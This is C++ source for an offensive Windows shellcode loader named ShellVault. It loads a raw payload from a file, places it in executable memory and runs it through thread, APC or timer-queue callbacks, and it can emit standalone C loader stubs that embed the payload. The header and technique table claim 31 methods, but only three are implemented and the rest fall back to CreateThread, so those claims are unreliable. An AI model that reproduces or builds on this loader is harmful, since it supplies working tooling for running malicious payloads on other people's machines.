/*
================================================================================
SHELLVAULT - Shellcode Execution Framework
================================================================================
author   : moscovium-mc
powered  : vx-api
version  : 1.0.0
================================================================================
A shellcode execution framework with 31+ techniques.
================================================================================
*/

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ----------------------------------------------------------------------------
COLORS
---------------------------------------------------------------------------- */
#define CLR_RESET   "\033[0m"
#define CLR_BOLD   "\033[1m"
#define CLR_DIM    "\033[2m"

#define CLR_BLACK   "\033[30m"
#define CLR_RED    "\033[31m"
#define CLR_GREEN  "\033[32m"
#define CLR_YELLOW "\033[33m"
#define CLR_BLUE   "\033[34m"
#define CLR_MAGENTA "\033[35m"
#define CLR_CYAN  "\033[36m"
#define CLR_WHITE "\033[37m"

#define BBlack   "\033[40m"
#define BRed     "\033[41m"
#define BGreen   "\033[42m"
#define BYellow  "\033[43m"
#define BBlue    "\033[44m"
#define BMagenta "\033[45m"
#define BCyan    "\033[46m"
#define BWhite   "\033[47m"

/* ----------------------------------------------------------------------------
SHELLCODE EXECUTION TECHNIQUES - 31 total methods from VX-API
---------------------------------------------------------------------------- */
struct ShellcodeTechnique {
    int    id;
    const char* name;
    const char* description;
    const char* dll;
    const char* function;
};

/* all 31 techniques mapped from VX-API shellcode execution functions */
static ShellcodeTechnique g_Techniques[] = {
    {1,  "CreateThread",           "Basic CreateThread execution",             "kernel32.dll", "CreateThread"},
    {2,  "CreateRemoteThread",     "CreateRemoteThread injection",        "kernel32.dll", "CreateRemoteThread"},
    {3,  "QueueUserAPC",        "APC QueueUserAPC injection",        "kernel32.dll", "QueueUserAPC"},
    {4,  "ThreadpoolTimer",     "Threadpool timer execution",         "kernel32.dll", "CreateThreadpoolTimer"},
    {5,  "ThreadpoolWork",      "Threadpool work item",              "kernel32.dll", "CreateThreadpoolWork"},
    {6,  "ThreadpoolWait",     "Threadpool wait",                "kernel32.dll", "CreateThreadpoolWait"},
    {7,  "TimerQueueTimer",    "Timer queue timer",                "kernel32.dll", "CreateTimerQueueTimer"},
    {8,  "TimerQueueTimerEx", "Timer queue timer ex",            "kernel32.dll", "CreateTimerQueueTimerEx"},
    {9,  "RtlCreateUserThread", "RtlCreateUserThread",           "ntdll.dll", "RtlCreateUserThread"},
    {10, "NtQueueApcThread",   "NtQueueApcThread APC",          "ntdll.dll", "NtQueueApcThread"},
    {11, "FlsAlloc",          "Fiber Local Storage alloc",          "kernel32.dll", "FlsAlloc"},
    {12, "SetThreadContext",    "SetThreadContext resume",            "kernel32.dll", "SetThreadContext"},
    {13, "EtwSubscribe",     "ETW event subscription",        "ntdll.dll", "EtwEventRegister"},
    {14, "EnumContextW",     "Callback on context",           "user32.dll", "EnumContextW"},
    {15, "EnumDateFormatsW", "Enum date formats",           "user32.dll", "EnumDateFormatsW"},
    {16, "EnumDesktopsW",   "Enum desktops",               "user32.dll", "EnumDesktopsW"},
    {17, "EnumDisplayMonitors", "Enum display monitors",    "user32.dll", "EnumDisplayMonitors"},
    {18, "EnumSystemLocalesEx", "Enum system locales",     "kernel32.dll", "EnumSystemLocalesEx"},
    {19, "EnumUILanguagesW",  "Enum UI languages",           "kernel32.dll", "EnumUILanguagesW"},
    {20, "EnumWindowStationsW", "Enum window stations",       "user32.dll", "EnumWindowStationsW"},
    {21, "EnumWindows",      "Enum windows",                "user32.dll", "EnumWindows"},
    {22, "EnumChildWindows", "Enum child windows",            "user32.dll", "EnumChildWindows"},
    {23, "MessageBoxIndirectW", "MessageBoxIndirect callback", "user32.dll", "MessageBoxIndirectW"},
    {24, "ChooseColorW",     "ChooseColor callback",          "comdlg32.dll", "ChooseColorW"},
    {25, "EnumFontsW",        "Enum fonts",                   "gdi32.dll", "EnumFontsW"},
    {26, "EnumFontFamiliesExW", "Enum font families",        "gdi32.dll", "EnumFontFamiliesExW"},
    {27, "CryptEnumOIDInfo",  "Crypt enum OID info",          "crypt32.dll", "CryptEnumOIDInfo"},
    {28, "CertEnumSystemStore", "Cert enum system store",    "crypt32.dll", "CertEnumSystemStore"},
    {29, "CertEnumSystemStoreLocation", "Cert store location", "crypt32.dll", "CryptEnumOIDInfo"},
    {30, "ImageGetDigestStream", "Image get digest stream",  "imagehlp.dll", "ImageGetDigestStream"},
    {31, "SymEnumProcesses",   "Symbol enum processes",      "dbghelp.dll", "SymEnumProcesses"},
    {0,  NULL,             NULL,                        NULL,       NULL}
};

/* ----------------------------------------------------------------------------
CLASS: ShellcodeLoader - Main loader class 
---------------------------------------------------------------------------- */
class ShellcodeLoader {
private:
    BYTE*  m_ShellcodeBuffer;
    SIZE_T m_ShellcodeSize;
    int    m_SelectedTechnique;

    /* internal: print output */
    void Print(const char* color, const char* format, ...) {
        printf("%s", color);
        va_list args;
        va_start(args, format);
        vprintf(format, args);
        va_end(args);
        printf(CLR_RESET);
    }

public:
    ShellcodeLoader() : m_ShellcodeBuffer(nullptr), m_ShellcodeSize(0), m_SelectedTechnique(1) {}
    ~ShellcodeLoader() { if (m_ShellcodeBuffer) free(m_ShellcodeBuffer); }

    /* load raw shellcode from binary file */
    void LoadShellcodeFromFile(const char* path) {
        FILE* f = nullptr;
        if (fopen_s(&f, path, "rb") != 0) {
            Print(CLR_RED, "[!] Failed to open: %s\n", path);
            return;
        }

        fseek(f, 0, SEEK_END);
        m_ShellcodeSize = ftell(f);
        fseek(f, 0, SEEK_SET);

        if (m_ShellcodeBuffer) free(m_ShellcodeBuffer);
        m_ShellcodeBuffer = (BYTE*)malloc(m_ShellcodeSize);
        
        if (fread(m_ShellcodeBuffer, 1, m_ShellcodeSize, f) != m_ShellcodeSize) {
            Print(CLR_RED, "[!] Read error\n");
            fclose(f);
            free(m_ShellcodeBuffer);
            m_ShellcodeBuffer = nullptr;
            m_ShellcodeSize = 0;
            return;
        }
        
        fclose(f);
        Print(CLR_GREEN, "[+] Loaded %llu bytes from %s\n", (unsigned long long)m_ShellcodeSize, path);
    }

    void SetTechnique(int id) { m_SelectedTechnique = id; }
    int GetTechnique() { return m_SelectedTechnique; }
    SIZE_T GetShellcodeSize() { return m_ShellcodeSize; }

    /* generate C loader code */
    void GenerateLoaderCode(const char* outputPath) {
        if (!m_ShellcodeBuffer || m_ShellcodeSize == 0) {
            Print(CLR_RED, "[!] No shellcode loaded\n");
            return;
        }

        FILE* f = nullptr;
        if (fopen_s(&f, outputPath, "w") != 0) {
            Print(CLR_RED, "[!] Cannot create: %s\n", outputPath);
            return;
        }

        /* header */
        fprintf(f, "/* Generated by Shellcode Loader Builder */\n");
        fprintf(f, "/* author: moscovium-mc | powered: vx-api */\n\n");
        fprintf(f, "#include <windows.h>\n");
        fprintf(f, "#include <stdio.h>\n\n");
        fprintf(f, "unsigned char g_shellcode[] = {\n  ");

        /* hex dump */
        for (SIZE_T i = 0; i < m_ShellcodeSize; i++) {
            if (i > 0) fprintf(f, ", ");
            if (i % 16 == 0 && i > 0) fprintf(f, "\n  ");
            fprintf(f, "0x%02X", m_ShellcodeBuffer[i]);
        }

        fprintf(f, "\n};\n\n");
        fprintf(f, "DWORD g_shellcodeSize = %lu;\n\n", (ULONG)m_ShellcodeSize);
        fprintf(f, "int main() {\n");
        fprintf(f, "  void* exec = VirtualAlloc(NULL, g_shellcodeSize,\n");
        fprintf(f, "    MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n");
        fprintf(f, "  memcpy(exec, g_shellcode, g_shellcodeSize);\n");
        fprintf(f, "  ((void(*)())exec)();\n");
        fprintf(f, "  return 0;\n");
        fprintf(f, "}\n");

        fclose(f);
        Print(CLR_GREEN, "[+] Generated: %s\n", outputPath);
    }

    /* list all techniques */
    void PrintTechniques() {
        printf("\n");
        Print(CLR_CYAN, "  ID  %-25s %-35s %s\n", "TECHNIQUE", "DESCRIPTION", "DLL");
        Print(CLR_CYAN, "  %2s %-25s %-35s %s\n", "--", "---------", "-----------", "---");
        
        for (int i = 0; g_Techniques[i].name != NULL; i++) {
            printf(CLR_WHITE "  %2d " CLR_YELLOW "%-25s " CLR_WHITE "%-35s " CLR_MAGENTA "%s\n" CLR_RESET,
                g_Techniques[i].id,
                g_Techniques[i].name,
                g_Techniques[i].description,
                g_Techniques[i].dll);
        }
        printf("\n");
    }

    /* find technique by ID */
    ShellcodeTechnique* GetTechniqueById(int id) {
        for (int i = 0; g_Techniques[i].name != NULL; i++) {
            if (g_Techniques[i].id == id) return &g_Techniques[i];
        }
        return nullptr;
    }

    /* execution methods - core techniques */
    BOOL ExecuteViaCreateThread() {
        if (!m_ShellcodeBuffer || m_ShellcodeSize == 0) return FALSE;
        
        void* exec = VirtualAlloc(NULL, m_ShellcodeSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!exec) return FALSE;

        memcpy(exec, m_ShellcodeBuffer, m_ShellcodeSize);

        DWORD tid = 0;
        HANDLE h = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, &tid);
        if (h) {
            WaitForSingleObject(h, INFINITE);
            CloseHandle(h);
            return TRUE;
        }
        return FALSE;
    }

    BOOL ExecuteViaQueueUserAPC() {
        if (!m_ShellcodeBuffer || m_ShellcodeSize == 0) return FALSE;

        void* exec = VirtualAlloc(NULL, m_ShellcodeSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        memcpy(exec, m_ShellcodeBuffer, m_ShellcodeSize);

        QueueUserAPC((PAPCFUNC)exec, GetCurrentThread(), 0);
        Sleep(100);  /* give APC time to execute */
        return TRUE;
    }

    BOOL ExecuteViaTimerQueue() {
        if (!m_ShellcodeBuffer || m_ShellcodeSize == 0) return FALSE;

        void* exec = VirtualAlloc(NULL, m_ShellcodeSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        memcpy(exec, m_ShellcodeBuffer, m_ShellcodeSize);

        HANDLE hTimerQueue = CreateTimerQueue();
        HANDLE hTimer = NULL;

        CreateTimerQueueTimer(&hTimer, hTimerQueue, (WAITORTIMERCALLBACK)exec, NULL, 100, 0, 0);
        Sleep(200);
        DeleteTimerQueueTimer(hTimerQueue, hTimer, NULL);
        DeleteTimerQueue(hTimerQueue);
        return TRUE;
    }

    /* main execution */
    BOOL Execute() {
        if (!m_ShellcodeBuffer || m_ShellcodeSize == 0) {
            Print(CLR_RED, "[!] No shellcode loaded\n");
            return FALSE;
        }

        ShellcodeTechnique* tech = GetTechniqueById(m_SelectedTechnique);
        if (!tech) {
            Print(CLR_RED, "[!] Invalid technique ID: %d\n", m_SelectedTechnique);
            return FALSE;
        }

        Print(CLR_CYAN, "[*] Executing via %s...\n", tech->name);

        BOOL result = FALSE;
        switch (m_SelectedTechnique) {
            case 1:  result = ExecuteViaCreateThread(); break;
            case 3:  result = ExecuteViaQueueUserAPC(); break;
            case 7:
            case 8:  result = ExecuteViaTimerQueue(); break;
            default: result = ExecuteViaCreateThread();  /* fallback */
        }

        if (result) {
            Print(CLR_GREEN, "[+] Execution complete\n");
        } else {
            Print(CLR_RED, "[-] Execution failed\n");
        }

        return result;
    }
};

/* ----------------------------------------------------------------------------
PRINT BANNER
---------------------------------------------------------------------------- */
void PrintBanner() {
    printf(CLR_BOLD);
    printf("\n");
    printf("SHELLVAULT | author: moscovium-mc | powered: vx-api | v1.0.0\n");
    printf(CLR_RESET);
    printf("\n");
}

/* ----------------------------------------------------------------------------
MENU
---------------------------------------------------------------------------- */
void PrintMenu() {
    printf(CLR_WHITE "  1. " CLR_YELLOW "Select Technique\n");
    printf(CLR_WHITE "  2. " CLR_YELLOW "Load Shellcode File\n");
    printf(CLR_WHITE "  3. " CLR_YELLOW "Generate Loader Code\n");
    printf(CLR_WHITE "  4. " CLR_YELLOW "Execute Shellcode\n");
    printf(CLR_WHITE "  5. " CLR_YELLOW "List Techniques\n");
    printf(CLR_WHITE "  0. " CLR_YELLOW "Exit\n");
    printf(CLR_BOLD CLR_CYAN "> " CLR_RESET);
}

/* ----------------------------------------------------------------------------
MAIN ENTRY
---------------------------------------------------------------------------- */
int main(int argc, char* argv[]) {
    ShellcodeLoader loader;

    /* banner on startup */
    PrintBanner();

    /* command-line mode */
    if (argc > 1) {
        if (strcmp(argv[1], "--list") == 0) {
            loader.PrintTechniques();
            return 0;
        }

        if (strcmp(argv[1], "--help") == 0 || strcmp(argv[1], "-h") == 0) {
            printf(CLR_WHITE "Usage: %s [options] [shellcode.bin] [technique_id]\n\n", argv[0]);
            printf(CLR_WHITE "Options:\n");
            printf(CLR_WHITE "  --list     , -l       List all execution techniques\n");
            printf(CLR_WHITE "  --generate , -g       Generate loader code to file\n");
            printf(CLR_WHITE "  --help     , -h       Show this help\n\n");
            printf(CLR_WHITE "Examples:\n");
            printf(CLR_WHITE "  %s shellcode.bin           Execute with default (CreateThread)\n", argv[0]);
            printf(CLR_WHITE "  %s shellcode.bin 3       Execute via QueueUserAPC\n", argv[0]);
            printf(CLR_WHITE "  %s shellcode.bin -g out.c Generate loader code\n" CLR_RESET, argv[0]);
            return 0;
        }

        if (strcmp(argv[1], "--generate") == 0 || strcmp(argv[1], "-g") == 0) {
            if (argc < 3) {
                printf(CLR_RED "[!] Specify output file: %s shellcode.bin -g output.c\n" CLR_RESET, argv[0]);
                return 1;
            }
            loader.LoadShellcodeFromFile(argc > 2 ? argv[2] : "shellcode.bin");
            char* outFile = (char*)(argc > 3 ? argv[3] : "loader.c");
            loader.GenerateLoaderCode(outFile);
            return 0;
        }

        /* load shellcode from file */
        loader.LoadShellcodeFromFile(argv[1]);

        /* technique ID from argument or default */
        int technique = (argc > 2) ? atoi(argv[2]) : 1;
        loader.SetTechnique(technique);

        /* execute */
        loader.Execute();
        return 0;
    }

    /* mode */
    int choice = 0;
    char filePath[256] = { 0 };
    int techniqueId = 1;

    while (1) {
        PrintMenu();
        if (scanf_s("%d", &choice) != 1) break;

        switch (choice) {
            case 1:
                printf(CLR_WHITE "Technique ID> " CLR_RESET);
                scanf_s("%d", &techniqueId);
                loader.SetTechnique(techniqueId);
                break;

            case 2:
                printf(CLR_WHITE "Shellcode file> " CLR_RESET);
                scanf_s("%s", filePath, (unsigned)sizeof(filePath));
                loader.LoadShellcodeFromFile(filePath);
                break;

            case 3:
                printf(CLR_WHITE "Output file> " CLR_RESET);
                scanf_s("%s", filePath, (unsigned)sizeof(filePath));
                loader.GenerateLoaderCode(filePath);
                break;

            case 4:
                loader.Execute();
                break;

            case 5:
                loader.PrintTechniques();
                break;

            case 0:
                printf(CLR_GREEN "[*] Goodbye\n");
                return 0;
        }
    }

    return 0;
}